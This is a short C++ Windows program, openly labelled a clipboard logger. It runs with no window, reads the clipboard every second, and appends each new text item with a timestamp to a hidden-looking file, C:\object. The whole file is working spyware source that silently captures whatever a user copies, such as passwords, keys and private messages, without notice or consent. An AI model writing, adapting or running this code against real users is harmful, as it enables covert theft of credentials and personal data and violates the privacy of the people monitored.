//clipboard logger

#include <iostream>
#include <windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <cstring>
#include <winuser.h>
#include <ctime>

DWORD WINAPI clip(LPVOID lpParam){
	char* last=NULL;
	last=(char*)malloc(sizeof(char)*3+1);
	strcpy(last,"***");
	while(1){
		Sleep(1000);
		OpenClipboard(0);
		if(IsClipboardFormatAvailable(CF_TEXT)||IsClipboardFormatAvailable(CF_OEMTEXT)){
			HANDLE hClipboard;
			hClipboard = GetClipboardData(CF_TEXT);
			char* data = (char*)GlobalLock(hClipboard);
			if(strcmp(data,last)!=0){
				free(last);
				FILE* fp = fopen("C:\\object","a+");
				time_t t = time(NULL);
				struct tm tm = *localtime(&t);
				fprintf(fp, "=============%d-%d-%d %d:%d:%d=============\n", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
				fprintf(fp,"%s\n=======================================\n\n",data);
				fclose(fp);
				last=(char*)malloc(sizeof(char)*strlen(data)+1);
				strcpy(last,data);
			}
		}
		CloseClipboard();
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPram, int nCmdShow){
	DWORD dwThreadId = 1;
    DWORD dwThrdParam = 1;
    HANDLE hThreadc = CreateThread(NULL, 0, clip, &dwThrdParam, 0, &dwThreadId);
	MSG Message;
	while(GetMessage(&Message,NULL,0,0)){
		DispatchMessage(&Message);
	}
	CloseHandle(hThreadc);
	return (int)Message.wParam;
}